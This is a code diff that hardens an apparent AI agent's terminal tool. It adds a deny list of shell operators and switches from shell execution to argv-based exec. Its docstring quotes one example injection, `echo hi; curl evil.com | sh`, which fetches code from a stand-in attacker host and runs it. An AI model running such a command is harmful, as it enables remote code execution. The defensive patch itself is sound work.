@@ -1,3 +1,12 @@
+"""
+Terminal tool with secure command validation.
+
+SECURITY: Validates the full command for shell metacharacters to prevent
+command injection via techniques like `echo hi; curl evil.com | sh`.
+The allowlist now applies to all commands in a pipeline, not just the first token.
+"""
+
+import re
 import shlex
 import time
 from pathlib import Path
@@ -13,7 +22,8 @@ manifest = ToolManifest(
     name="terminal",
     description=(
         "Run an allowlisted shell command in the project/workspace root "
-        "(e.g. python, git, pytest, npm, ls/dir). Do not use for file edits — use write_file/patch."
+        "(e.g. python, git, pytest, npm, ls/dir). Do not use for file edits — use write_file/patch. "
+        "Shell operators (;, &&, ||, |, $(), ``) are blocked for security."
     ),
     keywords=[
         "terminal",
@@ -30,13 +40,71 @@ manifest = ToolManifest(
         "properties": {
             "command": {
                 "type": "string",
-                "description": "Full shell command string to run (executable must be allowlisted)",
+                "description": "Shell command to run (executable must be allowlisted, no shell operators)",
             },
         },
         "required": ["command"],
         "additionalProperties": False,
     },
 )
+
+# Shell metacharacters that enable command chaining/injection
+# These allow bypassing the allowlist by running arbitrary commands after the first
+_DANGEROUS_SHELL_PATTERNS = [
+    (r';', 'semicolon (;) - command separator'),
+    (r'&&', 'double ampersand (&&) - command chaining'),
+    (r'\|\|', 'double pipe (||) - conditional execution'),
+    (r'\|(?!\|)', 'pipe (|) - command piping'),
+    (r'\$\(', 'command substitution $()'),
+    (r'`', 'backtick command substitution'),
+    (r'\$\{', 'variable expansion ${...}'),
+    (r'>', 'output redirection (>)'),
+    (r'<', 'input redirection (<)'),
+    (r'\n', 'newline - command separator'),
+    (r'\r', 'carriage return'),
+]
+
+
+def _validate_command_security(cmd: str) -> None:
+    """
+    Validate that a command doesn't contain shell injection vectors.
+    
+    Raises:
+        PermissionError: If dangerous shell metacharacters are found.
+    """
+    for pattern, description in _DANGEROUS_SHELL_PATTERNS:
+        if re.search(pattern, cmd):
+            raise PermissionError(
+                f"Command contains disallowed shell operator: {description}. "
+                "For complex operations, break them into separate tool calls."
+            )
+
+
+def _extract_executable(cmd: str) -> str:
+    """
+    Extract the executable name from a command string.
+    
+    Handles:
+    - Full paths: /usr/bin/python -> python
+    - Windows paths: C:\\Python311\\python.exe -> python
+    - Simple commands: python -> python
+    """
+    try:
+        parts = shlex.split(cmd, posix=False)
+    except ValueError as exc:
+        raise ValueError(f"Invalid command syntax: {exc}") from exc
+
+    if not parts:
+        raise ValueError("Command must not be empty.")
+
+    executable = parts[0].lower()
+    # Normalize path separators and extract basename
+    executable_name = executable.replace("\\", "/").split("/")[-1]
+    # Remove .exe extension on Windows
+    if executable_name.endswith(".exe"):
+        executable_name = executable_name[:-4]
+    
+    return executable_name
 
 
 class TerminalTool(BaseTool):
@@ -51,18 +119,11 @@ class TerminalTool(BaseTool):
             if not cmd:
                 raise ValueError("Command must not be empty.")
 
-            try:
-                parts = shlex.split(cmd, posix=False)
-            except ValueError as exc:
-                raise ValueError(f"Invalid command: {exc}") from exc
+            # SECURITY: Check for shell injection patterns BEFORE checking allowlist
+            _validate_command_security(cmd)
 
-            if not parts:
-                raise ValueError("Command must not be empty.")
-
-            executable = parts[0].lower()
-            executable_name = executable.replace("\\", "/").split("/")[-1]
-            if executable_name.endswith(".exe"):
-                executable_name = executable_name[:-4]
+            # Extract and validate the executable
+            executable_name = _extract_executable(cmd)
 
             if executable_name not in settings.terminal_allowlist:
                 raise PermissionError(
@@ -71,6 +132,13 @@ class TerminalTool(BaseTool):
                 )
 
             workdir = session_workspace()
+            
+            # Parse command into argv for exec (safer than shell)
+            try:
+                argv = shlex.split(cmd, posix=False)
+            except ValueError as exc:
+                raise ValueError(f"Invalid command syntax: {exc}") from exc
+            
             meta_base = {
                 "command": cmd,
                 "executable": executable_name,
@@ -78,8 +146,9 @@ class TerminalTool(BaseTool):
             }
 
             if settings.SANDBOX_FOR_TERMINAL:
+                # Sandbox can handle either string or list - pass list for safety
                 sandbox = await sandbox_manager.execute(
-                    cmd,
+                    argv,
                     workdir=workdir,
                     timeout=settings.TERMINAL_TIMEOUT_SECONDS,
                 )
@@ -115,8 +184,10 @@ class TerminalTool(BaseTool):
 
             import asyncio
 
-            process = await asyncio.create_subprocess_shell(
-                cmd,
+            # SECURITY: Use create_subprocess_exec with argv (no shell interpretation)
+            # This prevents any shell metacharacter processing that might bypass validation
+            process = await asyncio.create_subprocess_exec(
+                *argv,
                 cwd=str(workdir),
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE,
